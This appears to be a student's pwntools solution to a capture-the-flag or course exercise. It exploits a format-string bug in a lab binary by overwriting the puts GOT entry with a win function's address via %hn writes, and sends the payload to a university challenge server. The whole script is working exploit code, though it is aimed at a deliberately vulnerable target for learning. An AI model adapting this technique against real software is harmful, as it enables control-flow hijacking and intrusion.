from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25197

s = process('./program/07_call_functions', shell=True)

elf = ELF('./program/07_call_functions')
win_addr = elf.symbols['win']
puts_got_addr = elf.got['puts']

print(f"win address: {hex(win_addr)}")
print(f"puts GOT address: {hex(puts_got_addr)}")

# i need to overwrite the puts_got_addr with the addr of win 
win_low = win_addr & 0xffff
win_high = (win_addr >> 16) & 0xffff

# place GOT addresses (low, high) at positions 8 and 7 on the stack
payload = p32(puts_got_addr + 2) + p32(puts_got_addr)
written = len(payload)  # 8

# write high half to puts_got_addr+2 (pos 7)
padding1 = (win_high - written) % 0x10000
if padding1 == 0:
    padding1 = 0x10000
payload += f"%{padding1}x%7$hn".encode()
written = (written + padding1) % 0x10000

# write low half to puts_got_addr (pos 8)
padding2 = (win_low - written) % 0x10000
if padding2 == 0:
    padding2 = 0x10000
payload += f"%{padding2}x%8$hn".encode()

s = remote(SERVER, PORT, timeout=9999)
s.sendline(payload) 
response = s.recvall(timeout=1).decode(errors='ignore')
s.close()
print(response)